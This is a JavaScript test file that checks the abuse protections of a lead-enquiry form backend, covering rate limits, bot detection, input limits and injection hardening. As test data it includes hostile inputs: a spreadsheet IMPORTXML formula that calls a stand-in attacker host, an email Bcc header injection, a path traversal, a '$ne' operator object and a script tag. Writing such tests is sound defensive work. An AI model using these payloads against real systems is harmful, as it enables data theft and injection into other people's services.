'use strict';

/*
 * Attack tests: rate limits, spam protection and input hardening.
 *  - Google Apps Script backend (dist/apps-script/Code.gs on fake Google services)
 *  - Node server fallback (server/app.js)
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { loadAppsScript } = require('./support/gas-fakes');
const M = require('../shared/lead-messages');

const REQ = { quantity: 12000, targetUnitPriceCents: 30, packaging: true, delivery: true, deliveryPoint: 'Polokwane depot', leadType: 'tender-secured' };
const CONTACT = { fullName: 'Thandi Mokoena', company: 'Thandi Supplies', location: 'Polokwane', email: 'thandi@example.co.za', phone: '082 123 4567', privacyConsent: true, whatsappConsent: false };

function backend() {
  const t = loadAppsScript({ ownerEmail: 'admin@example.com' });
  t.gas.setup();
  t.leads = t.spreadsheet.getSheetByName('Leads');
  t.create = (extra = {}) => t.post({ action: 'create', requirements: REQ, elapsedMs: 20000, ...extra });
  t.submit = (draft, extra = {}) => t.post({ action: 'submit', ref: draft.lead.reference, token: draft.editToken, contact: CONTACT, ...extra });
  return t;
}
const count = (replies) => replies.reduce((acc, r) => ({ ...acc, [r.status]: (acc[r.status] || 0) + 1 }), {});

// ------------------------------------------------------------------ Apps Script: rate limits

test('Apps Script: a burst of 400 drafts is capped at 300 an hour', () => {
  const t = backend();
  const replies = Array.from({ length: 400 }, () => t.create());
  assert.deepEqual(count(replies), { 200: 300, 429: 100 });
  assert.equal(t.leads.getLastRow(), 301, 'only 300 rows written');
  assert.match(replies[399].message, /Too many requests/);
  // The counter is per clock hour: when the hour's entry expires the limit starts again.
  const key = [...t.cache.keys()].find((k) => k.startsWith('cap:create:'));
  assert.match(key, /^cap:create:\d+$/);
  t.cache.delete(key);
  assert.equal(t.create().status, 200);
});

test('Apps Script: submissions are capped at 150 an hour', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  t.state.mailQuota = 100000; // a Workspace-sized quota, so this test measures only the submission cap
  const drafts = Array.from({ length: 160 }, () => t.create());
  const replies = drafts.map((d) => t.submit(d));
  assert.deepEqual(count(replies), { 200: 150, 429: 10 });
  assert.equal(t.sent.length, 300, '2 emails for each accepted enquiry, none for the rest');
});

test('Apps Script: reads and saves are capped site-wide and per draft', () => {
  const t = backend();
  const draft = t.create();
  const ref = draft.lead.reference;
  const token = draft.editToken;
  const saves = Array.from({ length: 125 }, (_, i) => t.post({ action: 'update', ref, token, requirements: { ...REQ, quantity: 1000 + i } }));
  assert.deepEqual(count(saves), { 200: 120, 429: 5 }, 'one draft can be saved 120 times');

  const t2 = backend();
  const d2 = t2.create();
  t2.gas.LIMITS.readsPerHour = 2000;
  const reads = Array.from({ length: 2010 }, () => t2.post({ action: 'get', ref: d2.lead.reference, token: d2.editToken }));
  assert.deepEqual(count(reads), { 200: 2000, 429: 10 }, 'site-wide read/update cap');
});

test('Apps Script: one enquiry can only be submitted (or attempted) a few times', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  const draft = t.create();
  const attempts = Array.from({ length: 12 }, () => t.submit(draft, { contact: { ...CONTACT, email: 'not-an-email' } }));
  assert.deepEqual(count(attempts), { 422: 10, 429: 2 });
  assert.equal(t.submit(draft).status, 429, 'even a valid submit is refused after 10 attempts');
  assert.equal(t.sent.length, 0);
});

// ------------------------------------------------------------------ Apps Script: spam signals

test('Apps Script: bots that post instantly are rejected', () => {
  const t = backend();
  assert.equal(t.post({ action: 'create', requirements: REQ }).error, 'too_fast', 'no timing at all');
  assert.equal(t.create({ elapsedMs: 800 }).error, 'too_fast', 'saved 0.8 s after the page opened');
  const draft = t.create();
  const instant = t.submit(draft);
  assert.equal(instant.status, 400);
  assert.equal(instant.error, 'too_fast', 'contact details submitted the moment the draft was saved');
  assert.equal(t.sent.length, 0);
  t.gas.LIMITS.minMsDraftToSubmit = 0; // as if 3 seconds had passed
  assert.equal(t.submit(draft).status, 200);
});

test('Apps Script: the honeypot field rejects bots on draft and on submit', () => {
  const t = backend();
  assert.equal(t.create({ website: 'http://spam.example' }).status, 400);
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  const draft = t.create();
  assert.equal(t.submit(draft, { website: 'buy-now' }).status, 400);
  assert.equal(t.leads.rowObject(2).Status, 'Draft');
  assert.equal(t.sent.length, 0);
});

test('Apps Script: oversized, malformed and unexpected input is refused', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  assert.equal(t.post('x'.repeat(8 * 1024 + 1)).status, 413);
  assert.equal(t.post('{"action":').status, 400);
  assert.equal(t.post([1, 2]).status, 400);
  assert.equal(t.post({ action: 'deleteAll' }).status, 400);
  assert.equal(t.create({ isAdmin: true }).status, 400, 'unknown fields');
  assert.equal(t.create({ idempotencyKey: 'x' }).status, 400, 'idempotency key format');
  assert.equal(t.create({ idempotencyKey: { $ne: 1 } }).status, 400);
  assert.equal(t.post({ action: 'create', requirements: [REQ], elapsedMs: 20000 }).status, 400);
  assert.equal(t.create({ requirements: { ...REQ, quantity: 1e9 } }).status, 422);
  assert.equal(t.create({ requirements: { ...REQ, deliveryPoint: 'x'.repeat(161) } }).status, 422);

  const draft = t.create();
  const ref = draft.lead.reference;
  assert.equal(t.post({ action: 'get', ref: ref.toLowerCase(), token: draft.editToken }).status, 404);
  assert.equal(t.post({ action: 'get', ref, token: 'short' }).status, 404);
  assert.equal(t.post({ action: 'get', ref, token: 'f'.repeat(64) }).status, 404, 'right format, wrong token');
  assert.equal(t.post({ action: 'get', ref: '../../etc', token: draft.editToken }).status, 404);
  assert.equal(t.submit(draft, { contact: { ...CONTACT, fullName: 'x'.repeat(200) } }).status, 422);
  assert.equal(t.submit(draft, { contact: { ...CONTACT, email: 'a@b.c\nBcc: victim@example.com' } }).status, 422, 'no email header injection');
  for (const reply of [t.post({ action: 'nope' }), t.post('{')]) {
    assert.deepEqual(Object.keys(reply).sort(), ['error', 'message', 'status'], 'errors never include internals');
  }
});

test('Apps Script: formula injection in any text field is stored as plain text', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  const evil = '=IMPORTXML("http://evil.example","//a")';
  const draft = t.create({ requirements: { ...REQ, deliveryPoint: evil } });
  t.submit(draft, { contact: { ...CONTACT, fullName: evil, company: '+SUM(1,1)', location: '@cmd', email: '=1+1@evil.co' } });
  const raw = t.leads.raw[1];
  const col = (name) => raw[M.REGISTER_COLUMNS.indexOf(name)];
  for (const name of ['Name', 'Company', 'Town/City', 'Email', 'Delivery point']) {
    assert.match(String(col(name)), /^'[=+@]/, `${name} is stored as text`);
  }
});

test('Apps Script: repeated submits never send a second set of emails', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  const draft = t.create();
  const replies = Array.from({ length: 5 }, () => t.submit(draft));
  assert.deepEqual(replies.map((r) => r.alreadySubmitted), [false, true, true, true, true]);
  assert.equal(t.sent.length, 2);
});

test('Apps Script: a free Gmail quota (about 100 a day) covers about 50 enquiries, then only the team is emailed', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  for (let i = 0; i < 60; i += 1) t.submit(t.create());
  assert.equal(t.sent.filter((m) => m.to !== 'admin@example.com').length, 50, '50 customers acknowledged');
  assert.equal(t.sent.filter((m) => m.to === 'admin@example.com').length, 50, 'then Gmail refuses, even for the team');
  assert.equal(t.leads.getLastRow(), 61, 'but every enquiry is still saved in the Sheet');
});

test('Apps Script: when the Gmail quota is nearly used up, only the team is emailed', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  t.state.mailQuota = 1;
  const draft = t.create();
  assert.equal(t.submit(draft).status, 200);
  assert.deepEqual(t.sent.map((m) => m.to), ['admin@example.com']);
  assert.match(t.leads.rowObject(2)._history, /CUSTOMER_EMAIL_SKIPPED/);
});

test('Apps Script: a busy lock gives a clean 503, not a crash', () => {
  const t = backend();
  t.state.lockBusy = true;
  const reply = t.create();
  assert.equal(reply.status, 503);
  assert.equal(reply.error, 'busy');
  assert.equal(t.leads.getLastRow(), 1);
});

test('Apps Script: the team email links straight to the row and escapes customer text', () => {
  const t = backend();
  t.gas.LIMITS.minMsDraftToSubmit = 0;
  const draft = t.create();
  t.submit(draft, { contact: { ...CONTACT, fullName: '<script>alert(1)</script> Thandi' } });
  const team = t.sent[0];
  const sheet = t.spreadsheet.getUrl();
  const gid = t.leads.getSheetId();
  assert.match(team.body, new RegExp(`Open this enquiry in the lead register: ${sheet.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}#gid=${gid}&range=A2`));
  assert.match(team.body, /Dashboard: /);
  assert.match(team.htmlBody, /Open this enquiry in Google Sheets/);
  assert.match(team.htmlBody, new RegExp(`range=A2`));
  assert.doesNotMatch(team.htmlBody, /<script>/);
  assert.match(team.htmlBody, /&lt;script&gt;/);
  assert.equal(t.sent[1].htmlBody, undefined, 'the customer gets plain text');
});

// ------------------------------------------------------------------ Node server fallback

const { createApp } = require('../server/app');
const { FileLeadStore } = require('../server/lead-store');
const { createLeadService } = require('../server/lead-service');

async function nodeServer(options = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'plh-sec-'));
  const store = await new FileLeadStore(path.join(dir, 'leads.json')).init();
  const leadService = createLeadService({ store, notifier: { leadEvent: async () => {} }, logger: { error() {} } });
  const server = createApp({ rootDir: path.resolve(__dirname, '..'), leadService, logger: { error() {} }, ...options });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const base = `http://127.0.0.1:${server.address().port}`;
  const call = (method, url, { body, headers = {} } = {}) =>
    fetch(base + url, { method, headers: { ...(body ? { 'Content-Type': 'application/json' } : {}), ...headers }, body: body ? JSON.stringify(body) : undefined });
  return { call, close: () => new Promise((r) => server.close(r)) };
}

test('Node: faking X-Forwarded-For cannot dodge the per-visitor limit', async (t) => {
  const app = await nodeServer({ trustProxy: true, rateLimits: { create: { max: 2 } } });
  t.after(app.close);
  // The real proxy appends the true client address (10.0.0.5) after whatever the client sent.
  const statuses = [];
  for (let i = 0; i < 5; i += 1) {
    const response = await app.call('POST', '/api/leads', { body: { requirements: REQ }, headers: { 'X-Forwarded-For': `198.51.100.${i}, 10.0.0.5` } });
    statuses.push(response.status);
  }
  assert.deepEqual(statuses, [201, 201, 429, 429, 429]);
});

test('Node: HSTS only in production, hardening headers always', async (t) => {
  const dev = await nodeServer();
  const prod = await nodeServer({ hsts: true });
  t.after(() => Promise.all([dev.close(), prod.close()]));
  const devHome = await dev.call('GET', '/');
  const prodHome = await prod.call('GET', '/');
  assert.equal(devHome.headers.get('strict-transport-security'), null);
  assert.match(prodHome.headers.get('strict-transport-security'), /max-age=31536000/);
  assert.equal(devHome.headers.get('cross-origin-opener-policy'), 'same-origin');
  assert.match(devHome.headers.get('content-security-policy'), /object-src 'none'/);
});

test('Node: reads and updates are capped site-wide', async (t) => {
  const app = await nodeServer({ rateLimits: { update: { max: 1000 }, globalUpdate: { max: 3 } } });
  t.after(app.close);
  const statuses = [];
  for (let i = 0; i < 5; i += 1) statuses.push((await app.call('GET', '/api/leads/PLH-00000000', { headers: { 'X-Lead-Token': 'x' } })).status);
  assert.deepEqual(statuses, [404, 404, 404, 429, 429]);
});
